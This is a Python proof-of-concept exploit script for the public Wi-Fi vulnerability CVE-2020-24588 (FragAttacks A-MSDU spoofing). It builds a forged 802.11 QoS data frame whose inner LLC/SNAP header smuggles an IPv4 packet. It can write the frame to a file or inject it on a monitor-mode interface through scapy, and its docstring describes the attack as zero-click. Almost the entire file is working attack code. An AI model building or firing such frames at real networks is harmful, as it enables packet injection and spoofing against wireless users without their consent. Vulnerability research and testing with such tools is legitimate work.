#!/usr/bin/env python3
"""CVE-2020-24588 — FragAttacks: A-MSDU spoofing. The receiver honours the
A-MSDU Present bit but mishandles the inner LLC/SNAP, so a forged header is
interpreted as IP payload -> packet injection/spoofing. Zero-click.
Public (Mathy Vanhoef). Confidence: HIGH.

Inject on a monitor-mode iface: scapy.sendp(frame, iface="mon0") or use --inject."""
import struct, sys
from pathlib import Path

def _radiotap():
    return bytes.fromhex("00000a000000000000000000")   # 8-byte radiotap, no fields

def build(dst="ffffffffffff", src="001122334455", bssid="66778899aabb") -> bytes:
    """802.11 QoS data frame with the A-MSDU Present bit set and a forged
    inner LLC/SNAP claiming to be IPv4."""
    fc = bytes.fromhex("8802")          # QoS data, to-DS
    dur = b"\x00\x00"
    seq = b"\x10\x00"
    qos = b"\x00\x80"                   # TID 0, A-MSDU Present bit (bit 7 of 2nd byte)
    # inner A-MSDU subframe: DA, SA, len, then LLC/SNAP + forged payload
    inner_llc = bytes.fromhex("aaaa030000000800")        # LLC/SNAP -> IPv4
    forged_ip = bytes.fromhex("4500001c0001000040110000") + \
                bytes.fromhex("0a0000010a000002") + b"\x00" * 4
    sub = (bytes.fromhex(dst) + bytes.fromhex(src) +
           struct.pack(">H", len(inner_llc) + len(forged_ip)) + inner_llc + forged_ip)
    return (_radiotap() + fc + dur + bytes.fromhex(dst) + bytes.fromhex(src) +
            bytes.fromhex(bssid) + seq + qos + sub)

def inject(iface, frame=None):
    try:
        from scapy.all import sendp, Raw
        sendp(Raw(frame or build()), iface=iface, verbose=False)
        print(f"[+] CVE-2020-24588 A-MSDU frame injected on {iface}")
        return True
    except Exception as e:
        print(f"[-] {e}"); return False

def main():
    if len(sys.argv) > 2:
        inject(sys.argv[1])
    else:
        out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2020-24588.frame")
        d = build(); out.write_bytes(d)
        print(f"[+] CVE-2020-24588 A-MSDU frame -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
